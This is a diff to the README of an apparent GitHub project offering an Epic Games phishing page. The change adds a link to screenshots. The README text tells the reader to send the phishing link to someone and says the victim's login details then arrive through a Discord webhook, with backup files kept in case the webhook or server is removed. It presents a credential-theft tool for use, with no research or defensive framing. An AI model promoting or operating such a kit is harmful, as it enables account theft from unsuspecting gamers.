@@ -28,7 +28,7 @@ Epic Games Phishing Page working with Discord webhook or save it on a .txt file.
 
 # ❓ - How do its work ?
 Copy the link and send it to someone idk 🤷‍♂️.
-Then when the user loggin, you are going to recive the webhook embed with all infos [Exemple here]()
+Then when the user loggin, you are going to recive the webhook embed with all infos [Exemple here](https://github.com/Ib69/epic-games-phishing#---some-screens)
 There is 2 files with the infos that are going to be created in case your webhook get deleted or if you server got deleted, again, idk 🤷‍♂️.
 
 # 📷 - Some Screens...
